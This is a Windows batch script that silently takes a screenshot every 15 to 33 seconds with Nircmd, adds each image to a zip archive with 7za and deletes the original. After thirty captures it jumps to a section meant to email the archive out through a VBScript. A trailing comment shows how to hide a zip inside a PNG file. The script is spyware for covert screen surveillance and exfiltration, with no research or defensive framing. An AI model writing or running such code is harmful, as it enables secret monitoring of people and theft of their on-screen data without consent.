REM inside a named folder////////////////////
set /a n=0
set /a count=0

Nircmd.exe savescreenshot b\sc%n%.png
REM "C:\Program Files\WinZip\wzzip" b\send.zip b\sc%n%.png
7za a b\send.zip b\sc%n%.png
del /f b\sc%n%.png
set /a n =%n% +1
set /a count =%count% +1
timeout /t 15




:s

Nircmd.exe savescreenshot b\Sc%n%.png
REM "C:\Program Files\WinZip\wzzip" b\send.zip b\sc%n%.png
7za a b\send.zip b\sc%n%.png
del /f b\sc%n%.png
set /a n =%n% +1
set /a count =%count% +1
timeout /t 33

if "%count%" == "30" goto :send


goto :s

:send
'CScript //nologo b\emailsend.vbs
'del /f b\send.zip
goto :s




REM copy /b a.png+ a.zip a.png